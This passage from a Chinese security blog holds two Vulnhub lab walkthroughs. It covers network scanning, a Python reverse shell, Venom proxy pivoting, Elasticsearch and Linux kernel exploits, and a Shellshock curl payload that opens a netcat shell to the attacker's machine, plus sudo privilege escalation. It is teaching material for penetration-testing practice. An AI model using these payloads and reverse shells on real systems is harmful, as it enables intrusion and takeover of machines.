<li>回到 virtual box，<code>管理-&gt;主机网络管理器</code></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144440.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144448.png" /></p>
<p>第一张图中的IPv4地址修改成刚刚弹出的IP地址，其他也需要对应的修改为同一网段。</p>
<ol start="3" type="1">
<li>将kali和靶机都设置为如下</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144559.png" /></p>
<p>到这一步，打开kali会发现其实无法上网，那是因为此时没有路由，输入命令
<code>route -n</code> 结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144727.png" /></p>
<p>（我涂掉的那一行应该是没有的，我后天添加上去的）</p>
<ol start="4" type="1">
<li>添加路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo route add default gw 192.168.137.1 （刚刚记住的IP）</span><br></pre></td></tr></table></figure>
<p>然后再次查看路由，结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144914.png" /></p>
<p>此时 <code>ping baidu.com</code>
发现有数据包，成功连接外网。（每次开机都需要添加一次路由，需要永久的可以百度）</p>
<p>到此为止，配置结束。</p>
<h1 id="渗透">渗透</h1>
<p>打开kali和靶机，开始渗透。kali 的IP 为
<code>192.168.137.101</code>。</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">或者 sudo nmap 192.168.137.0/24</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145228.png" /></p>
<p>第一个是网关，第二个是主机在该网段的IP，所以第三个就是靶机的IP地址。</p>
<p>靶机IP Get！</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.102</span><br></pre></td></tr></table></figure>
<p>在渗透的过程中最好全端口扫描，不要有遗漏！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145500.png" /></p>
<p>开放端口为 22， 5000。</p>
<p>端口信息 Get！</p>
<h2 id="端口服务发现">端口服务发现</h2>
<p>知道开放端口后，扫面一下对应端口的服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 192.168.137.102</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145655.png" /></p>
<p>发现 5000 端口上的服务是 http，可能存在网页。版本信息为
<code>Werkzeug httpd 0.14.1</code> ， 用的是
python2，说明靶机存在着python环境。版本为 <code>2.7.15</code>。</p>
<p>（百度一下 Werkzeug，Werkzeug
是一个WSGI工具包，也可以作为一个Web框架的底层库。）</p>
<h2 id="访问http服务">访问http服务</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327150053.png" /></p>
<p>经过测试，只有这一个功能点，作用是将输入的内容显示出来。</p>
<p><strong>web应用程序最重要的一步就是目录扫描！</strong></p>
<h2 id="目录扫描">目录扫描</h2>
<p>推荐使用
<code>dirsearch</code>，（如果没有的话可以按照提示安装）命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dirsearch -u http://192.168.137.102:5000/</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154504.png" /></p>
<p>注意到有一个结果，访问看看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154534.png" /></p>
<h2 id="反弹shell">反弹shell</h2>
<p>根据这个页面的提示，这里好像可以执行代码，之前的信息里说明这个环境使用python搭建的，因此尝试以下python的代码执行，可以百度一下python反弹shell的代码（修改一下kali的IP和监听端口）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.137.101&quot;</span>,<span class="number">8888</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>然后在kali上监听对应的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155030.png" /></p>
<p>（注意，要先监听，然后再执行 python 反弹 shell 的代码，大致上可以理解
kali 开启一个服务然后让靶机来链接，如果 kali 没开就连不上）</p>
<p>成功反弹shell，运气很好，是 root。查看一下文件，发现有一个
<code>dockerfile</code>
文件。熟悉docker的应该感觉不对劲，<strong>可能这是一个docker容器，并不是真实的主机！</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155120.png" /></p>
<p>查看 <code>Dockerfile</code> ，发现是docker模板文件：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155427.png" /></p>
<p>进一步怀疑当前是一个docker系统。接下来用两个方法进一步确定：</p>
<ol type="1">
<li><code>ls /.dockerenv</code>，根目录存在该文件，大概率为docker系统；
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155548.png" /></li>
<li><code>cat /proc/1/cgroup</code>，Linux初始化进程（进程id为1）的cgroup中包含着docker镜像信息的时候，可以确定是docker；
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155620.png" /></li>
</ol>
<p>查看以下IP地址，发现IP地址和kali扫描出来的不一样</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327160430.png" /></p>
<p>docker系统的这个网段可以当作是目标主机的内网网段，接下来就需要做到：</p>
<ol type="1">
<li>内网是否存在其他主机</li>
<li>哪台主机是真实的目标</li>
<li>是否存在漏洞可以利用</li>
</ol>
<h2 id="内网主机发现">内网主机发现</h2>
<p>可以通过 <code>ping</code>
只要修改最后面的数值即可，但是这里子网有16位，也就是有65535个IP地址需要测试。
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 255);do ping -c 1 172.17.0.$i; done</span><br><span class="line"></span><br><span class="line">for i in $(seq 0 255);do for j in $(seq 1 255);do ping -c 1 172.17.$i.$j;done;done</span><br><span class="line">解释：双层循环，-c后面的 1 表示一个地址只发一个数据包</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327185626.png" /></p>
<p>发现内网内只有3个IP地址存活（这个脚本运行的比较慢，也可以用工具）。</p>
<p>当前IP地址是
172.17.0.2，那么接下来就需要对另外两个主机进行扫描，因为kali的工具无法直接应用在内网环境下，所以需要利用代理，将172.17.0.2作为代理对内网主机进行扫描。</p>
<h2 id="内网穿透">内网穿透</h2>
<p>内网穿透工具：<a href="https://github.com/Dliv3/Venom">venom</a></p>
<p>kali 另开一个cmd监听 9999 端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191518.png" /></p>
<p>kali 开启 http 服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8295</span><br><span class="line"></span><br><span class="line">注意：要在venom所在目录运行，换句话说，要在agent.exe在的</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191624.png" /></p>
<p>靶机从kali下载代理端，并运行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.137.101:8295/agent_linux_x64 根据靶机的操作系统选择对应的代理端</span><br><span class="line">如果提示没有文件，查看以下kali开启的http服务是否在venom目录下</span><br><span class="line"></span><br><span class="line">chmod +x agent_linux_x64</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.137.101 -rport 9999</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327192942.png" /></p>
<p>启动 socks5 代理： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show</span><br><span class="line">2. goto 1</span><br><span class="line">3. socks 1080 端口可以选其他的</span><br></pre></td></tr></table></figure> <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327193102.png" /></p>
<p>接下来修改配置文件
<code>proxychains4.conf</code>，这样就可以让工具通过代理进行工作了，命令前要加上
<code>proxychains</code>。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">将原来的 socks4 127.0.0.1 9050 注释</span><br><span class="line">添加：</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p>
<h2 id="内网信息收集">内网信息收集</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. proxychains4 nmap -Pn -sT 172.17.0.1</span><br><span class="line">2. proxychains4 nmap -Pn -sT 172.17.0.3</span><br></pre></td></tr></table></figure>
<p>结果分别为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194514.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194527.png" /></p>
<p>可以看到 172.17.0.1 的端口和服务与之前扫描 192.168.137.102
的时候一模一样，所以推测，这就是真正的主机。</p>
<p>可以做一下验证，利用浏览器去访问 <code>172.17.0.1:5000</code>
，如果出现对应的页面，即可确定这就是真正的主机。</p>
<p>不过浏览器也要设置代理，（其实也可以用
<code>proxychains4 firefox</code>
来打开浏览器，但是我这里不知道为什么实现不了）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195300.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195311.png" /></p>
<p>到此，可以完全确定 <code>172.17.0.1</code> 就是真正的主机！还有
<code>172.17.0.2</code>
也需要扫描（这里是因为我们之前拿到的是webshell，扫描看一下有没有漏洞能拿到shell权限）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195702.png" /></p>
<p>发现 9200 端口打开。查看一下对应的服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195826.png" /></p>
<p><code>Elasticsearch</code> 版本为
1.4.2。可以用msf查看一下是否存在漏洞。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327200545.png" /></p>
<p>可以一个一个尝试，先尝试第一个。将exp复制到当前目录：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201304.png" /></p>
<p>可以用 <code>cat 36337.py</code> 查看一下exp说明，发现是 python2
编写的。</p>
<p>执行exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201554.png" /></p>
<p>又得到一个root权限，但是我们知道，这并不是真正的目标主机，因此进行信息收集。先查看目录，发现有一个
passwords 的文件。查看其中的内容：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201855.png" /></p>
<p>密码一般都是md5加密的，故尝试将所有密码用md5解密，推荐网址：<a
href="https://www.somd5.com/">MD5解密</a>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john:1337hack</span><br><span class="line">test:1234test</span><br><span class="line">admin:1111pass</span><br><span class="line">root:1234pass</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure></p>
<p>想去目标主机开了 22 端口，服务为
ssh，因此尝试使用者这些账号和密码连接： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh [-p 22] john@192.168.100.102 不指定端口的话，默认就是22</span><br></pre></td></tr></table></figure></p>
<p>经尝试，发现只有 john 能够成功登录。接下来就是提权了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327202920.png" /></p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>Linux提权一般优先考虑内核漏洞进行提权。从ssh连接可以看出靶机的系统为
Ubuntu 并且版本为
3.13.0，当且的版本因该是5.x。这里差了两个大更新，因此大概率存在着漏洞。用msf搜索。
<code>searchsploit linux kernel 3.13</code>
可以看到搜索出很多，真实场景的话需要一个一个尝试，这里就挑选一个
37292.c</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203630.png" /></p>
<p>复制exp到当前目录
<code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></p>
<p>这是c编写的，需要用 gcc 编译，但是目标主机可能没有
gcc，所以需要在kali上编译完在传到靶机。因为它是C语言写的，所以查看一下内容是否还有编译的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203936.png" /></p>
<p>注意到，代码中还调用system，然后利用 gcc
进行编译，因此要进行修改。把相关的代码删除，然后进行编译。（删掉部分从图中第二行开始到if语句结束）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o a</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327205736.png" /></p>
<p>将 <code>ofs-lib.so</code> 文件也复制到相同目录，一起传到目标主机。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line"></span><br><span class="line">如果提示：var/lib/mlocate/mlocate.db: 没有那个文件或目录。说明数据库太久没更新了，利用 updtedb 更新一下在搜索即可、</span><br><span class="line"></span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211113.png" /></p>
<p>然后开启http服务，目标主机下载这两个文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211453.png" /></p>
<blockquote>
<p>为了更好的利用exp，建议将这两个文件移到 <code>tmp</code>
目录，因为这个目录的权限一般比较多</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure>
<p>执行exp拿到root权限。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cd /tmp</span><br><span class="line">2. chmod +x a</span><br><span class="line">3. ./a</span><br><span class="line">4. id</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211724.png" /></p>
<p>到此为止，整个靶机的攻击过程都结束了。</p>
<h1 id="总结">总结</h1>
<p>完整的渗透过程主要有三个部分：</p>
<ol type="1">
<li>利用Web漏洞，拿到webshell，然后再拿到低权限shell；</li>
<li>权限提升，收集内网信息，确认存活主机。信息收集的越多，发现的可利用漏洞越多，第三步越容易成功；</li>
<li>依次拿到权限，最终拿到目标主机的root权限（比如域控）；</li>
</ol>
<p>该靶机给我的最大启示如下：</p>
<ol type="1">
<li>找到漏洞exp的时候不要着急的利用，先查看一下代码，代码中所利用的命令可能目标主机上并没有，所以需要在我们自己的主机上准备就绪后再传到目标主机。</li>
<li><code>/tmp</code> 权限比较多</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>10 Vulnhub HackSudoThor Writeup</title>
    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo:
Thor</a></p>
<p>难度：中</p>
<p>目标：取得root权限 + 2 Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web路径爬取</li>
<li><strong>开源源码泄露</strong></li>
<li>默认账号密码</li>
<li><strong>破壳漏洞</strong></li>
<li><strong>GTFOBins提权</strong></li>
</ul>
<h1 id="common-gateway-interface-基础">Common Gateway Interface
基础</h1>
<p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
<p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
<p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
<p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
<center>
输入
</center>
<p>Web服务器调用某个cgi程序，首先把HTTP请求中的信息以环境变量的方式写入OS，然后CGI程序通过语言库函数来获取环境变量从而获得数据的输入。除此之外，还可以通过标准输入获得数据，比如POST请求调用cgi程序时，cgi程序就会通过标准输入获得body中的数据。</p>
<p>总结：</p>
<ol type="1">
<li>如果不经过HTTP请求，那么cgi程序获得整个OS的环境变量；</li>
<li>如果经过HTTP请求，那么cgi程序除了获得整个OS的环境变量之外，还会额外获得HTTP头部信息；</li>
</ol>
<center>
输出
</center>
<p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
<h1 id="破壳漏洞">破壳漏洞</h1>
<h2 id="概述">概述</h2>
<p>Bash
4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
<h2 id="前置技术">前置技术</h2>
<p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
<h3 id="bash基础">bash基础</h3>
<p>在bash中，可以自定义变量，如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
<p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
<p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
<p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
<p>将函数导入全局变量之后</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a
href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
<h2 id="影响的版本">影响的版本</h2>
<p>bash version &lt;= 4.3</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p><a
href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash
Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
<h2 id="利用分析">利用分析</h2>
<p><strong>漏洞原理</strong>：</p>
<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
<p><strong>接下来才是漏洞产生的重点：</strong></p>
<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
<p>并且此时<code>func</code>也会被当作函数执行。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
<p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3）
2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如
User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改
User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！
中间那个<code>echo</code>
不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
</blockquote>
<h2 id="利用场景">利用场景</h2>
<ul>
<li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
<li><p>环境变量的赋值字符串来源于用户输入 ,
且没有通过有效的过滤</p></li>
</ul>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
<ul>
<li>21端口的服务为ftp</li>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，apache2.4.38</li>
<li>靶机操作系统为debian</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址
https://github.com/zakee94/online-banking-system</p>
<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
<p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
<p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
<p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
<h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
<p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
<p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
<p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
<p>反弹成功！</p>
<h2 id="权限提升">权限提升</h2>
<p>首先查看一下sudo配置<code>sudo -l</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
<p>然后要求我们输入，我们输入几条系统命令看一下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
<p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
